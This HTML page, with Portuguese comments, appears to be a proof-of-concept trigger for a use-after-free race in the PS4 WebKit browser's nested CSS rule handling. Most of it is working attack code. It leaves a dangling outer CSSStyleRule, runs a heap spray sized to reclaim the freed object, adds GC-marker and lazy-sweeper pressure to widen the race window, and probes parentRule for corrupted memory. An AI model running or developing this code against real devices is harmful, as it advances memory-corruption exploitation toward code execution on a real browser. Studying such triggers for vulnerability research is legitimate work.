<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CSS UAF Race — root(CSSRule*) — PS4 WebKit</title>
<style>
  body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 13px; margin: 0; padding: 16px; }
  h2   { color: #58a6ff; margin: 0 0 4px; font-size: 14px; letter-spacing: .05em; }
  #status { color: #3fb950; margin-bottom: 12px; }
  #counters { display: flex; gap: 24px; margin-bottom: 12px; }
  .ctr  { background: #161b22; border: 1px solid #30363d; padding: 8px 14px; border-radius: 4px; }
  .ctr span { display: block; font-size: 20px; font-weight: bold; }
  .ctr.red span  { color: #f85149; }
  .ctr.yel span  { color: #d29922; }
  .ctr.grn span  { color: #3fb950; }
  .ctr.blu span  { color: #58a6ff; }
  #log  { background: #0d1117; border: 1px solid #30363d; padding: 10px; height: 340px;
          overflow-y: auto; white-space: pre-wrap; font-size: 12px; border-radius: 4px; }
  .anomaly { color: #f85149; }
  .info    { color: #8b949e; }
  .warn    { color: #d29922; }
  .ok      { color: #3fb950; }
  #progress { width: 100%; height: 4px; background: #21262d; margin-bottom: 12px; border-radius: 2px; }
  #bar { height: 4px; background: #58a6ff; width: 0%; border-radius: 2px; transition: width .1s; }
</style>
</head>
<body>

<h2>CSS UAF Race · root(CSSRule*) · GC marker thread × lazy sweeper</h2>
<div id="status">Inicializando…</div>
<div id="progress"><div id="bar"></div></div>

<div id="counters">
  <div class="ctr grn"><label>Iterações</label><span id="c-iter">0</span></div>
  <div class="ctr blu"><label>parentRule = obj</label><span id="c-obj">0</span></div>
  <div class="ctr yel"><label>parentRule = null</label><span id="c-null">0</span></div>
  <div class="ctr red"><label>Anomalias / EXC</label><span id="c-exc">0</span></div>
</div>

<div id="log"></div>

<script>
"use strict";

// ─── Logging ────────────────────────────────────────────────────────────────
const logEl  = document.getElementById('log');
const status = document.getElementById('status');
const cIter  = document.getElementById('c-iter');
const cObj   = document.getElementById('c-obj');
const cNull  = document.getElementById('c-null');
const cExc   = document.getElementById('c-exc');
const bar    = document.getElementById('bar');

function log(msg, cls) {
    const line = document.createElement('span');
    if (cls) line.className = cls;
    line.textContent = msg + '\n';
    logEl.appendChild(line);
    if (logEl.children.length > 600)
        logEl.removeChild(logEl.firstChild);
    logEl.scrollTop = logEl.scrollHeight;
}

// ─── Estrutura vulnerável ────────────────────────────────────────────────────
//
//  Modelo de memória relevante:
//
//  JSCSSStyleRule (outer)          JSCSSStyleRule (nested)
//  └─ Ref<CSSStyleRule> impl ──►  CSSStyleRule (outer C++)
//                                  └─ (raw ptr) m_parentRule  ← NÃO é Ref<>
//
//  Após deleteRule(0):
//    sheet solta RefPtr<CSSRule>   → Ref no impl do outer JS wrapper = 1
//    nestedRules = null            → JSCSSRuleList torna-se dead cell
//
//  Race window:
//    GC marker thread: root(nested C++) → lê m_parentRule → derreferencia outer C++
//    Lazy sweeper (main thread, durante qualquer alloc):
//      varre dead JSCSSRuleList → chama destrutor → dropa Ref<CSSStyleRule>
//      SE refcount do outer C++ cai a 0 → ~CSSStyleRule() → memória liberada
//      Marker então lê memória liberada → UAF
//
const styleEl = document.createElement("style");
document.head.appendChild(styleEl);
const sheet   = styleEl.sheet;
sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);

let nestedRules  = sheet.cssRules[0].cssRules; // cria JSCSSRuleList
const nested     = nestedRules[0];             // JSCSSStyleRule da regra filha

sheet.deleteRule(0);   // sheet solta RefPtr — outer perde ancoragem no sheet
nestedRules = null;    // JSCSSRuleList torna-se dead cell; quando swept:
                       //   → CSSStyleRuleList::~JSCSSRuleList dropa Ref<>
                       //   → se único Ref restante era o JS wrapper → free

log('nested            : ' + nested, 'info');
log('parentRule inicial: ' + nested.parentRule, 'info');
log('outer JS wrapper  : unreachable (apenas lazy sweeper pode dropar o Ref<>)', 'info');
log('');

// ─── Grafo CSS auxiliar ──────────────────────────────────────────────────────
// Muitos wrappers CSS vivos fazem o GC marker trabalhar por mais tempo
// durante visitAdditionalChildrenInGCThread, aumentando a janela de corrida.
// Também cria mais dead JSCSSRuleLists para o lazy sweeper processar.
const auxSheets = [];
const AUX_COUNT = 40;
const RULES_PER_SHEET = 15;

for (let i = 0; i < AUX_COUNT; i++) {
    const el = document.createElement("style");
    document.head.appendChild(el);
    const sh = el.sheet;
    for (let j = 0; j < RULES_PER_SHEET; j++) {
        try {
            sh.insertRule(
                `.a${i}b${j} { font-size: ${j+1}px; ` +
                `& .c { color: hsl(${i*9},50%,50%); } }`, 0
            );
        } catch(e) {}
    }
    // Cria JSCSSRuleList (acesso a cssRules) e solta imediatamente → dead cell
    void sh.cssRules;
    auxSheets.push(sh);
}
log(`${AUX_COUNT} folhas auxiliares × ${RULES_PER_SHEET} regras criadas (grafo para o marker)`, 'info');
log('');

// ─── Heap spray ──────────────────────────────────────────────────────────────
//
//  Objetivos:
//  (a) Allocs pequenas (~64 B) → aciona lazy sweeper frequentemente
//      e pode reutilizar a região exata do CSSStyleRule liberado
//  (b) Object graph → mantém concurrent GC marker ocupado (slow walk)
//  (c) Allocs grandes → força GC major cycles, mantém marker ativo
//
let sinks = [];

function heapSpray() {
    // Faixa de tamanho de CSSStyleRule no PS4 WebKit: ~48–128 bytes
    // sizeof(RefCounted)=16 + sizeof(CSSRule)=16 + sizeof(CSSStyleRule)~=32
    for (let i = 0; i < 1000; i++) sinks.push(new Uint8Array(48));
    for (let i = 0; i < 600;  i++) sinks.push(new Uint8Array(64));
    for (let i = 0; i < 300;  i++) sinks.push(new Uint8Array(128));

    // Object graph: cada objeto tem filhos → marker precisa traversar recursivamente
    for (let i = 0; i < 4000; i++)
        sinks.push({ a: i, b: { c: i, d: [i, i+1] }, e: new Uint8Array(16) });

    // Alocações grandes → GC major cycle
    for (let i = 0; i < 40; i++)
        sinks.push(new Uint8Array(32 * 1024));

    // Libera periodicamente → sweeper encontra trabalho a fazer
    if (sinks.length > 100_000) sinks = [];
}

// ─── Geração de pressão adicional em JSCSSRuleLists ─────────────────────────
// Cria e solta CSSRuleLists ciclicamente → mais dead cells para o lazy sweeper
function rulePressure() {
    for (let i = 0; i < auxSheets.length; i++) {
        try {
            // Acessar cssRules cria (ou retorna cached) JSCSSRuleList
            // Não reter a referência → lista torna-se dead candidate imediatamente
            void auxSheets[i].cssRules;
        } catch(e) {}
    }
}

// ─── Probe: observa comportamento do parentRule sob pressão ─────────────────
let iter       = 0;
let nullCount  = 0;
let objCount   = 0;
let excCount   = 0;
const anomalies = [];
const TOTAL_ITER = 25_000;

function probe() {
    try {
        const pr = nested.parentRule;

        if (pr === null) {
            nullCount++;
            const msg = `[${iter}] *** parentRule === null *** — outer coletado ou dangling limpo`;
            log(msg, 'warn');
            anomalies.push(msg);
            return;
        }

        objCount++;

        // Acessa membros internos do wrapper retornado.
        // Se UAF e a região foi realocada com dados incompatíveis:
        //   → type pode ser um valor inválido (≠ 1)
        //   → cssText / selectorText podem ser strings corrompidas ou crash
        try {
            const t   = pr.type;         // deve ser 1 (STYLE_RULE)
            const css = pr.cssText;      // deve ser string ".outer { ... }"
            const sel = pr.selectorText; // deve ser string ".outer"

            const typeOk = (t === 1);
            const cssOk  = (typeof css === 'string' && css.includes('outer'));
            const selOk  = (typeof sel === 'string' && sel.includes('outer'));

            if (!typeOk || !cssOk || !selOk) {
                excCount++;
                const msg = `[${iter}] ANOMALIA — type=${t}(${typeof t}) css=${typeof css}[${String(css).slice(0,20)}] sel=${typeof sel}[${String(sel).slice(0,20)}]`;
                log(msg, 'anomaly');
                anomalies.push(msg);
            }
        } catch(e) {
            excCount++;
            const msg = `[${iter}] EXCEPTION ao acessar membros do parentRule: ${e}`;
            log(msg, 'anomaly');
            anomalies.push(msg);
        }

    } catch(e) {
        excCount++;
        const msg = `[${iter}] EXCEPTION em nested.parentRule: ${e}`;
        log(msg, 'anomaly');
        anomalies.push(msg);
    }
}

// ─── Loop principal ───────────────────────────────────────────────────────────
function step() {
    heapSpray();
    rulePressure();
    probe();

    iter++;
    cIter.textContent = iter;
    cObj.textContent  = objCount;
    cNull.textContent = nullCount;
    cExc.textContent  = excCount;
    bar.style.width   = (iter / TOTAL_ITER * 100).toFixed(1) + '%';

    if (iter % 1000 === 0) {
        log(`[${iter}] null=${nullCount} obj=${objCount} exc=${excCount} sinks=${sinks.length}`, 'info');
        status.textContent = `Rodando — iteração ${iter} / ${TOTAL_ITER}`;
    }

    if (iter < TOTAL_ITER) {
        requestAnimationFrame(step);
    } else {
        finalReport();
    }
}

function finalReport() {
    bar.style.width = '100%';
    bar.style.background = (anomalies.length || nullCount || excCount) ? '#f85149' : '#3fb950';

    log('');
    log('═══════════════════════════════════════════', 'info');
    log('  RESULTADO FINAL', 'info');
    log('═══════════════════════════════════════════', 'info');
    log(`  Iterações totais : ${iter}`, 'info');
    log(`  parentRule = obj  : ${objCount}`, 'info');
    log(`  parentRule = null : ${nullCount}`, nullCount  ? 'warn'    : 'info');
    log(`  Exceções / anom.  : ${excCount}`,  excCount   ? 'anomaly' : 'info');
    log(`  Anomalias         : ${anomalies.length}`, anomalies.length ? 'anomaly' : 'info');
    log('');

    if (anomalies.length || nullCount || excCount) {
        log('>>> Comportamento anômalo detectado', 'anomaly');
        log('    parentRule null ou membro corrompido sob pressão de heap.', 'anomaly');
        log('    Evidência consistente com UAF ou gestão de vida útil incorreta.', 'anomaly');
        if (anomalies.length <= 20) {
            log('');
            log('Anomalias:', 'warn');
            anomalies.forEach(a => log('  ' + a, 'warn'));
        }
        status.textContent = '⚠ Comportamento anômalo detectado — ver log';
        status.style.color = '#f85149';
    } else {
        log('>>> parentRule retornou objeto válido em todas as iterações', 'ok');
        log('    Opaque root manteve o outer vivo durante todo o teste.', 'ok');
        log('    Race condition não acionável via spray síncrono neste firmware.', 'ok');
        log('    Próximo passo: análise estática de visitAdditionalChildrenInGCThread', 'ok');
        log('    em libSceNKWebKit.sprx para confirmar a presença da race.', 'ok');
        status.textContent = 'Concluído — sem anomalia detectada';
        status.style.color = '#3fb950';
    }
}

log(`Iniciando ${TOTAL_ITER.toLocaleString()} iterações`, 'info');
log(`Grafo CSS: ${AUX_COUNT * RULES_PER_SHEET} regras aninhadas como carga para o marker`, 'info');
log('');
requestAnimationFrame(step);
</script>
</body>
</html>
